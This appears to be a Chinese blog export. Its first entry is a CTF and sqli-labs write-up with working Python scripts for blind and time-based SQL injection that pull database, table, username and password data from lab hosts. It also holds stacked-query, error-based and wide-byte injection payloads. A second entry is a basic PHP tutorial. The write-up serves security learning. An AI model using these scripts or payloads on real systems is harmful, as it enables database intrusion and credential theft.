import requestsurlOPEN = &#x27;http://challenge-eb0855b296d32f7a.sandbox.ctfhub.com:10800/?id=&#x27;mark = &#x27;query_success&#x27;def database_name():    name = &#x27;&#x27;    for j in range(1,5):        for i in &#x27;qwertyuiopasdfghjklzxcvbnm&#x27;:            url = urlOPEN + &#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27; % (j, i)            r = requests.get(url)            if mark in r.text:                name = name + i                print(name)                break    print(&#x27;database_name&#x27;,name)database_name()//爆出数据库

less-8爆出数据库名：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;def database_name():    db_name = &#x27;&#x27;    for i in range(1, 9):        for k in &#x27;qwertyuiopasdfghjklzxcvbnm&#x27;:            payload = urlOPEN + &quot;?id=1&#x27;and substr(database(),%d,1)=&#x27;%s&#x27;--+&quot; % (i, k)            res = requests.get(payload)            if &#x27;You are in...........&#x27; in res.text:                db_name += k                print(db_name)                break    print(&quot;数据库为: %s&quot; % db_name)database_name()

爆出数据库下面有4张表：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;tab_num = 0while True:    payload = urlOPEN + &quot;?id=1&#x27;and (select count(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)=%d--+&quot; % tab_num    res = requests.get(payload)    if &#x27;You are in...........&#x27; in res.text:        print(&quot;数据库共有&quot; + str(tab_num) + &quot;张表&quot;)        break    else:        tab_num += 1

爆出表的长度和名字：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;for i in range(1, 5):    tab_len = 0    while True:        payload = urlOPEN + &quot;?id=1&#x27;and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit %d,1)=%d--+&quot; % (i - 1, tab_len)        res = requests.get(payload)        if &#x27;You are in...........&#x27; in res.text:            print (&#x27;第%d张表长度为:&#x27;%i+str(tab_len))            break        if tab_len == 30:            print(&#x27;error!&#x27;)            break        tab_len += 1    tab_name = &#x27;&#x27;    for j in range(1, tab_len + 1):        for m in &#x27;qwertyuiopasdfghjklzxcvbnm&#x27;:            payload = urlOPEN + &quot;?id=1&#x27;and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit %d,1),%d,1)=&#x27;%s&#x27;--+&quot; % (i - 1, j, m)            res = requests.get(payload)            if &#x27;You are in...........&#x27; in res.text:                tab_name += m                # print (tab_name)    print(&quot;[-]第%d张表名为: %s&quot; % (i, tab_name))

爆破字段数和字段名的脚本和上面类似
爆破users表下的uesrname字段：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;usn_num = 0char = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_-&quot;while True:    payload = urlOPEN + &quot;?id=1&#x27;and (select count(username) from security.users)=%d--+&quot; % usn_num    res = requests.get(payload)    if &quot;You are in&quot; in res.text:        print(usn_num)        break    usn_num += 1for i in range(1, usn_num + 1):    usn_len = 0    while True:        payload = urlOPEN + &quot;?id=1&#x27;and (select length(username) from security.users limit %d,1)=%d--+&quot; % (i - 1, usn_len)        res = requests.get(payload)        if &quot;You are in&quot; in res.text:            print(&quot;第%d的长度为%d&quot;%(i,usn_len))            break        usn_len += 1    usr_name = &#x27;&#x27;    for k in range(1, usn_len + 1):        for m in char:            payload = urlOPEN + &quot;?id=1&#x27;and substr((select username from security.users limit %d,1),%d,1)=&#x27;%s&#x27;--+&quot; % (i - 1, k, m)            res = requests.get(payload)            if &quot;You are in&quot; in res.text:                usr_name += m                break    print(usr_name)

爆破uses表下的password字段和上面类似
如果脚本还有不懂可以点击[这里](sqli-labs_less8布尔盲注脚本_sqlilab less8盲注脚本-CSDN博客)
时间注入时间注入是利用sleep()或者benchmark()等函数让MySQL的执行时间变长，通过时间的改变来判断结果
模板语句：if(length(database())&gt;1,sleep(3),1)
意思就是，如果数据库库名的长度大于1，则MySQL查询休眠3秒，否则查询1。查询1的结果大约一般只有几十毫秒，根据网页的响应时间，就可以判断条件是否正确
语法：if(expr1，expr2，expr3)语法含义：如果expr1是true，则if()的返回值为expr2，否则返回值则为expr3
1 and if(length(database())=4,sleep(3),1)：查询数据库长度
接下来的步骤就是把 length(database()=4)进行更换，跟手动布尔盲注差不多
less-9?id=1&#39; and if(length(database())=8,sleep(3),1) --+：得出数据库长度为8，下面为脚本的方法：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def database_len():    for i in range(1,10):        payload = &quot;?id=1&#x27; and if(length(database())&gt;%d,sleep(2),0)--+&quot; %i        url1 = url + payload        time1 =datetime.datetime.now()        r=requests.get(url1)        time2=datetime.datetime.now()        time3 = (time2-time1).total_seconds()        if time3 &gt;= 2:            print(i)        else:            print(i)            break    print(&#x27;数据库长度为:&#x27;,i)database_len()

爆出数据库名：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def database_name():    name=&#x27;&#x27;    for i in range(1,9):        for j in p1:            payload=&quot;?id=1&#x27; and if(substr(database(),%s,1)=&#x27;%s&#x27;,sleep(4),1)--+&quot; %(i,j)            url1=url+payload            time1=datetime.datetime.now()            r=requests.get(url1)            time2=datetime.datetime.now()            time3=(time2-time1).total_seconds()            if time3 &gt;= 4:                name += j                print(name)                break    print(&#x27;数据库名字为:&#x27;,name)database_name()

?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1))&gt;0,sleep(3),1) --+：得到数据库下面有4张表
爆破表的长度可见题目less-8
爆破表的名字：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def tables_name():    global table4    table1=&#x27;&#x27;    table2=&#x27;&#x27;    table3=&#x27;&#x27;    table4=&#x27;&#x27;    for i in range(4):        for j in range(1,6):            for t in p1:                payload=&quot;?id=1&#x27; and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=&#x27;%s&#x27;),3,0)) --+&quot;%(i,j,t)                url1=url+payload                time1=datetime.datetime.now()                r=requests.get(url1)                time2=datetime.datetime.now()                time3=(time2-time1).seconds                if time3 &gt;= 3:                    if i == 0:                        table1 +=t                        print(&#x27;第一个表为:&#x27;,table1)                    elif i == 1:                        table2 += t                        print(&#x27;第二个表为：&#x27;,table2)                    elif i == 2:                        table3 +=t                        print(&#x27;第三个表为：&#x27;,table3)                    elif i == 3:                        table4 += t                        print(&#x27;第四个表为：&#x27;,table4)                    else:                        break    print(&#x27;第一个表为&#x27;+table1)    print(&#x27;第二个表为&#x27;+table2)    print(&#x27;第三个表为&#x27; + table3)    print(&#x27;第四个表为&#x27; + table4)tables_name()

爆破字段数，长度，名字的脚本类似
爆破一行的字段内容（可以通过更改 limit 0,1来更改爆破地方，可以去看less-8的爆破）：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def s_content():    content1=&#x27;&#x27;    for i in range(20):            for t in p1:                payload = &quot;?id=1&#x27; and sleep(if((substr((select password from users limit 0,1),%s,1)=&#x27;%s&#x27; ),3,0)) --+&quot;%(i,t)                url1 =url+payload                time1=datetime.datetime.now()                r = requests.get(url1)                time2 = datetime.datetime.now()                time3 = (time2-time1).seconds                if time3 &gt;=3:                        content1 += t                        print(&#x27;password字段一内容为：&#x27;+content1)                        break    print(&#x27;字段内容为：&#x27;+content1)s_content()

less-10双引号闭合，剩下的和less-9一样
less-15(post传参脚本)&amp;less-16注意：该题逻辑运算符要用or
通过万能密钥 1&#39; or 1=1看到了成功登录时的图片
uname=1&#39; or length(database())=8#&amp;passwd=1数据库长度为8
sql-labs-less15&#x2F;less16|SQL注入|脚本时间注入-腾讯云开发者社区-腾讯云 (tencent.com)
爆破数据库名字
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-15/&quot;def get_dbname():    db_name = &#x27;&#x27;    for i in range(1,9):        for k in range(32,127):            database_payload = &#123;&quot;uname&quot;:&quot;admin&#x27; and if(ascii(substr(database(),%d,1))=%d,sleep(2),1)#&quot;%(i,k),&quot;passwd&quot;:&quot;1&quot;&#125;            time1 = datetime.datetime.now()            res = requests.post(url,database_payload)            time2 = datetime.datetime.now()            difference = (time2-time1).seconds            if difference &gt; 1:                db_name += chr(k)                print(&quot;数据库名为-&gt;&quot;+db_name)get_dbname()

查表名
table_payload = &#123;&quot;uname&quot;:&quot;admin&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=\&#39;security\&#39; limit %d,1),%d,1))=%d,sleep(2),1)#&quot;%(i,j,k),&quot;passwd&quot;:&quot;1&quot;&#125;可以这么写
less-16：Post传参，双引号加括号闭合
堆叠注入堆叠查询可以执行多条语句，多语句之间可以以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。
@堆叠查询注入模板语句：
1&#x27;;select * from major;#

SQL预处理（Prepare），是一种特殊的SQL处理方式；预处理不会直接执行SQL语句，而是先将SQL语句编译，生成执行计划，然后通过Execute命令携带SQL参数来执行SQL语句。
预定义prepare模板：
prepare xxx as select * from user where id=1;  //将select查询语句定义为xxxexecute xxx;  //再使用execute来执行这个变量xxx即可执行上诉的select查询语句

set是SQL Server中对已经定义的变量赋值方式
BUUCTF [强网杯 2019]随便注单引号包含，字段数为2
return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);：一些关键词被过滤掉了
0&#39;;show databases;--+：显示出所有数据库名
0&#39;;show tables;--+：显示出所有表名
0&#x27;;desc `1919810931114514`;--+：显示出表的字段名

发现有个字段是flag，于是用预定义语句来查询flag字段
0&#x27;;sEt@a=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);PRepare hello from @a;execute hello;--+

二次注入BUUCTF [RCTF 2015]EasySQL在帐号处输入一些特殊字符，然后去更改密码，可以测出是双引号闭合，会返回报错语句，可以判定是存在二次注入的，在注册的时候写入，然后再修改密码的地方修改密码后触发，这样就导致错误的输出，这里有错误的回显就可以使用报错注入来进行注入
过滤掉了很多的字符
推测的查询语句为 select * from 表名 where id=&quot;%s&quot; and pwd=&quot;密码&quot;
1&quot;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)#：查询出数据库
后面操作就是报错注入了
1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#:WHERE real_flag_1s_here REGEXP &#39;^f&#39; 表示筛选出 real_flag_1s_here 列值以字母 ‘f’ 开头的行。REGEXP 是正则表达式匹配操作符，’^’ 表示匹配行首（不这样子的话数据是一堆XXXXXXX）
1&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#：获得到剩下的flag，不过是反着的
less-24没有任何过滤，只能做到可以修改admin密码的程度，网上题解也就到这个程度
Cookie注入就是注入的地方变成了cookie
CTFHUB Web SQL Cookie注入做这种题目最好用bp抓包不要直接用hackbar，不好用，操作跟union注入的一样
宽字节注入哪里存在这个注入漏洞
由于数据库查询前执行了SET NAMES&#39; GBK&#39;，将编码设置为宽字节GBK，所以此处是存在宽字节注入漏洞
在PHP中，通过iconv()进行编码转换时，也可能存在宽字符注入漏洞
less-32&amp;less-33&amp;less-34function check_addslashes($string)&#123;    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);    return $string;&#125;if(isset($_GET[&#x27;id&#x27;]))&#123;$id=check_addslashes($_GET[&#x27;id&#x27;]);

这里通过使用id&#x3D;1’的查询方式发现，Hint中告知了后端将我们的语句进行了\转义，参数id&#x3D;1在数据库查询时是被单引号包围的。当传入id&#x3D;1’时，传入的单引号又被转义符（反斜线）转义，导致参数ID无法逃逸单引号的包围，所以在一般的情况下，此处是不存在SQL注入漏洞的。不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式就是在地址后面加一个**%df**，再加单引号，可以通过上面的测试发现，在单引号之前PHP会自动加一个\（反斜杠），因为反斜杠的编码为%5c，所以自动转义为\&#39;，而在GBK编码中，%df5c是繁体字“連”，由于汉字是双字节，所以这里&#39;之前的\就会被吃掉消失，那么会造成单引号成功逃逸，爆出MySQL数据库的错误
?id=0%df&#39;union select 1,2,3--+：发现就回显2，3
?id=0%df&#39;union select 1,2,database()--+：爆数据库名
?id=0%df&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())--+：爆表名
?id=0%df&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name = (select table_name from information_schema.tables where table_schema = (select database())limit 0,1)--+：爆一个个表的字段
?id=0%df&#39;union select 1,(select group_concat(id) from emails),(select group_concat(email_id) from emails)--+：爆表的内容
less-33：和less-32一样，这里就不多说了
less-34：只是传参方式从get变成了post而已，剩下的都没有变
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>php</title>
    <url>/2023/10/28/php/php/</url>
    <content><![CDATA[php基础php变量PHP 变量规则：

变量以 $ 符号开始，后面跟着变量的名称

变量名必须以字母或者下划线字符开始

变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）

变量名不能包含空格

变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
（注意：php变量和php语句都是区分大小写的）


PHP 没有声明变量的命令，变量在您第一次赋值给它的时候被创建
php有四种不同的变量作用域：local,global,static,parameter。
局部和全局作用域：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。
php global关键字

static作用域
当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。要做到这一点，请在您第一次声明变量时使用 static 关键字

php的echo,printecho 和 print 区别：

echo - 可以输出一个或多个字符串
print - 只允许输出一个字符串，返回值总为 1

提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1
php EOF(heredoc)使用说明PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。
使用概述：


必须后接分号，否则编译通不过。



EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。


3. 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。

开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。



当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。




php数据类型php字符串（string)
一个字符串是一串字符的序列，就像 “Hello world!”。你可以将任何文本放在单引号和双引号中
php整型（integer)
整数规则：整数必须至少有一个数字 (0-9)；整数不能包含逗号或空格；整数是没有小数点的；整数可以是正数或负数；整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）
php浮点型（float）
即带小数部分的数字或是指数形式
var_dump( )函数返回变量的数据类型和值
php布尔型（boolean）
布尔型可以是true或false，通常用于条件判断
php数组（aarray）
可以一个变量储存多个值
&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt;

php对象（object）
php null值
NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。
NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。
例子：可以通过设置变量值为 NULL 来清空变量数据：
&lt;?php$x=&quot;Hello world!&quot;;$x=null;var_dump($x);?&gt;

php资源类型（resource）
PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。常见资源数据类型有打开文件、数据库连接、图形画布区域等。
由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义。
使用 get_resource_type() 函数可以返回资源（resource）类型

php类型比较松散比较：使用两个&#x3D;&#x3D;比较，只比较值，不比较类型
严格比较：用三个等号&#x3D;&#x3D;&#x3D;比较，除了比较值，也比较类型
php常量一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。
注意：常量在整个脚本中都可以使用
设置常量，使用define()函数：bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )
例子：define(&quot;GREETING&quot;,&quot;欢迎来到这里&quot;,false)(false可以省略)
该函数有三个参数:

name：必选参数，常量名称，即标志符。

value：必选参数，常量的值。

case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。
注意：自 PHP 7.3.0 开始，定义不区分大小写的常量已被弃用。从 PHP 8.0.0 开始，只有 false 是可接受的值，传递 true 将产生一个警告。


php字符串变量php中只有一个字符串运算符，那就是***并置运算符(.)***：把两个字符串连接起来
例子：
&lt;?php$txt1=&quot;Hello world!&quot;;$txt2=&quot;What a nice day!&quot;;echo $txt1 . &quot; &quot; . $txt2;?&gt;//例子中用了两个并置运算符，这是因为在两个字符串中间加了一个空格

php strlen()函数
该函数返回字符串的长度（字节数）
strlen() 常常用在循环和其他函数中，因为那时确定字符串何时结束是很重要的。（例如，在循环中，我们需要在字符串中的最后一个字符之后结束循环。）
php strpos()函数
该函数用于在字符串中查找一个字或一个指定的文本。
如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE
&lt;?phpecho strpos(&quot;Hello world!&quot;,&quot;world&quot;);?&gt;

php运算符php算术运算符

还有一个运算符：**intdiv()**，该函数返回值为第一个参数除于第二个参数的值并向下取整
&lt;?php var_dump(intdiv(10, 3)); ?&gt;
php赋值运算符
“&#x3D;”; “+&#x3D;”; “-&#x3D;”; “*&#x3D;”; “&#x2F;&#x3D;”; “%&#x3D;”; “.&#x3D;”(例子：a.&#x3D;b即a&#x3D;a.b)
php递增&#x2F;递减运算符
++x  ;  x++  ;  –x  ;  x–
php比较运算符

php逻辑运算符

php数组运算符

三元运算符
即？：（跟c语言的三元运算符用法一致）
NULL 合并运算符会判断变量是否存在且值不为NULL，如果是，它就会返回自身的值，否则返回它的第二个操作数。
$site = $_GET[&#39;site&#39;] ?? &#39;php中文网&#39;;
组合运算符
PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 **&lt;&#x3D;&gt;**。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。
语法格式如下：
$c = $a &lt;=&gt; $b;

解析如下：

如果 $a &gt; $b, 则 $c 的值为 1。
如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0。
如果 $a &lt; $b, 则 $c 的值为 -1。

if…else…；switch都与C语言中的用法一致
php数组用array( )函数来创建数组
三种数组：数值数组 - 带有数字 ID 键的数组；关联数组 - 带有指定的键的数组，每个键关联一个值；多维数组 - 包含一个或多个数组的数组
php数值数组
两种方法：自动分配ID键（总是从0开始）；人工分配ID键：$cars[0]=&quot;Volvo&quot;;
count( )函数
用于获取数组的长度（元素的数量）
遍历数值数组
&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);$arrlength=count($cars);for($x=0;$x&lt;$arrlength;$x++)&#123;    echo $cars[$x];    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;

php关联数组
关联数组是使用分配给数组的指定的键的数组
两种方法
$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);or:$age[&#x27;Peter&#x27;]=&quot;35&quot;;$age[&#x27;Ben&#x27;]=&quot;37&quot;;$age[&#x27;Joe&#x27;]=&quot;43&quot;;

如何使用
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);echo &quot;Peter is &quot; . $age[&#x27;Peter&#x27;] . &quot; years old.&quot;;?&gt;

遍历关联数组
使用foreach循环
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);foreach($age as $x=&gt;$x_value)&#123;    echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value;    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;

php数组排序sort( )
对数组中的元素按照字母升序排列
&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BWM&quot;,&quot;Toyota&quot;);sort($cars);print_r($cars);?&gt;

对数组中的元素按照数字升序排列
rsort( )
对数组中的元素进行字母降序排列
对数组中的元素按照数字降序排列
和上面sort( )用法一致
asort( )
根据数组的值，对关联数组进行升序排列
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); asort($age); print_r($age); ?&gt;

ksort( )
根据数组的键，对关联数组进行升序排列
&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);ksort($age);print_r($age);?&gt;

arsort( )
根据数组的值，对关联数组进行降序排列
跟上面用法一致
krsort( )
根据数组的键，对数组进行降序排列
php超级变量php超级全局变量列表：$GLOBALS；$_SERVER；$_REQUEST；$_POST；$_GET；$_FILES；$_ENV；$_COOKIE；$_SESSION
php $GLOBALS
$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键
&lt;?php $x = 75; $y = 25;function addition() &#123;     $GLOBALS[&#x27;z&#x27;] = $GLOBALS[&#x27;x&#x27;] + $GLOBALS[&#x27;y&#x27;]; &#125;addition(); echo $z; 

php $_SERVER
$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。
实操：在本地PHP文件中输入一下代码，列出$_SERVER的内容
​			 访问该PHP页面，显示出$_SERVER的全部内容
&lt;?php echo &quot;&lt;pre&gt;&quot;;print_r($_SERVER);?&gt;

$_SERVER中所有的重要元素
php &amp;_REQUEST
PHP $REQUEST 用于收集HTML表单提交的数据。
以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据:
&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;&quot;&gt;Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php$name = $_REQUEST[&#x27;fname&#x27;];echo $name;?&gt;&lt;/body&gt;&lt;/html&gt;

php $_POST
被广泛应用于收集表单数据，在html form标签的指定该属性：method&#x3D;”post”
php $_GET
PHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”。
$_GET 也可以收集URL中发送的数据
while循环跟C语言中的whille循环用法一致
for循环用法与C语言中的一致
foreach循环
和上文所说作用一样，用来遍历数组
每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。
foreach ($array as $value)&#123;    要执行代码;&#125;

&lt;?php$x=array(&quot;Google&quot;,&quot;Runoob&quot;,&quot;Taobao&quot;);foreach($x as $value)&#123;    echo $value .PHP_EOL;&#125;?&gt;

每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。
foreach ($array as $key =&gt; $value)&#123;    要执行代码;&#125;

&lt;?php$x=array(1=&gt;&quot;Google&quot;,2=&gt;&quot;Runoob&quot;,3=&gt;&quot;Taobao&quot;);foreach($x as $key =&gt; $value)&#123;    echo &quot;key 为&quot;.$key.&quot;,对应的value为&quot;.$value.PHP_EOL;&#125;?&gt;

php函数创建语法
&lt;?phpfunction functionName()&#123;    // 要执行的代码&#125;?&gt;

函数准则：函数名称应该显示出它的功能；函数名称以字母或下划线开头（不能以数字开头）
添加函数
参数就在函数名称后面的一个括号内指定
&lt;?phpfunction writeName($fname)&#123;    echo $fname . &quot; Refsnes.&lt;br&gt;&quot;;&#125;echo &quot;My name is &quot;;writeName(&quot;Kai Jim&quot;);echo &quot;My sister&#x27;s name is &quot;;writeName(&quot;Hege&quot;);echo &quot;My brother&#x27;s name is &quot;;writeName(&quot;Stale&quot;);?&gt;

返回值
让函数返回一个值，用return语句
&lt;?phpfunction add($x,$y)&#123;    $total=$x+$y;    return $total;&#125;echo &quot;1 + 16 = &quot; . add(1,16);?&gt;

php魔术常量这八个魔术常量不区分大小写
LINE
文件中的当前行号
LINE旁边是两条下划线
&lt;?phpecho &#x27;这是第 &quot; &#x27;  . __LINE__ . &#x27; &quot; 行&#x27;;?&gt;

FILE
文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名
用法和上面一致，旁边也是两条下滑线
——DIR——
文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(FILE)。除非是根目录，否则目录中名不包括末尾的斜杠。
——FUNCTION——
函数名称，本常量返回该函数被定义时的名字（区分大小写）
&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;&#125;test();?&gt;

——CLASS——
类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\Bar）
&lt;?phpclass test &#123;    function _print() &#123;        echo &#x27;类名为：&#x27;  . __CLASS__ . &quot;&lt;br&gt;&quot;;        echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;    &#125;&#125;$t = new test();$t-&gt;_print();?&gt;

——TRAIT——
没看懂，之后需要认真再理解一遍
——METHOD——
类的方法名。返回该方法被定义时的名字
&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __METHOD__ ;&#125;test();?&gt;

——NAMESPACE——
当前命名空间的名称（区分大小写）。此常量是在编译时定义的
&lt;?phpnamespace MyProject; echo &#x27;命名空间为：&quot;&#x27;, __NAMESPACE__, &#x27;&quot;&#x27;; // 输出 &quot;MyProject&quot;?&gt;

php命名空间********目前不要求掌握，之后再来学吧
目的是解决重名问题，php不允许两个函数或者类出现相同的名字
PHP 命名空间可以解决以下两类问题：

用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。
为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性

定义命名空间必须在所有代码之前声明命名空间
可以在一个文件中定义不同的命名空间代码，建议使用大括号
&lt;?phpnamespace MyProject &#123;    const CONNECT_OK = 1;    class Connection &#123; /* ... */ &#125;    function connect() &#123; /* ... */  &#125;&#125;namespace AnotherProject &#123;    const CONNECT_OK = 1;    class Connection &#123; /* ... */ &#125;    function connect() &#123; /* ... */  &#125;&#125;?&gt;

将全局的非命名空间中的代码与命名空间中的代码组合在一起，只能使用大括号形式的语法。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来
&lt;?phpnamespace MyProject &#123;const CONNECT_OK = 1;class Connection &#123; /* ... */ &#125;function connect() &#123; /* ... */  &#125;&#125;namespace &#123; // 全局代码session_start();$a = MyProject\connect();echo MyProject\Connection::start();&#125;?&gt;

在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句
declare(encoding=&#x27;UTF-8&#x27;); //定义多个命名空间和不包含在命名空间中的代码

子命名空间与目录和文件的关系很像，PHP 命名空间也允许指定层次化的命名空间的名称
namespace MyProject\Sub\Level;  //声明分层次的单个命名空间

命名空间的使用php面向对象对象的主要三个特性：
对象的行为：对象可以执行的操作，比如：开灯，关灯就是行为。
对象的形态：对对象不同的行为是如何响应的，比如：颜色，尺寸，外型。
对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。

比如 Animal(动物) 是一个抽象类，我们可以具体到一只狗跟一只羊，而狗跟羊就是具体的对象，他们有颜色属性，可以写，可以跑等行为状态。
面向对象编程的三个主要特性：
封装（Encapsulation）：指将对象的属性和方法封装在一起，使得外部无法直接访问和修改对象的内部状态。通过使用访问控制修饰符（public、private、protected）来限制属性和方法的访问权限，从而实现封装。
继承（Inheritance）：指可以创建一个新的类，该类继承了父类的属性和方法，并且可以添加自己的属性和方法。通过继承，可以避免重复编写相似的代码，并且可以实现代码的重用。
多态（Polymorphism）：指可以使用一个父类类型的变量来引用不同子类类型的对象，从而实现对不同对象的统一操作。多态可以使得代码更加灵活，具有更好的可扩展性和可维护性。在 PHP 中，多态可以通过实现接口（interface）和使用抽象类（abstract class）来实现。

php类定义语法格式如下：
&lt;?phpclass phpClass &#123;  var $var1;  var $var2 = &quot;constant string&quot;;    function myfunc ($arg1, $arg2) &#123;     [..]  &#125;  [..]&#125;?&gt;

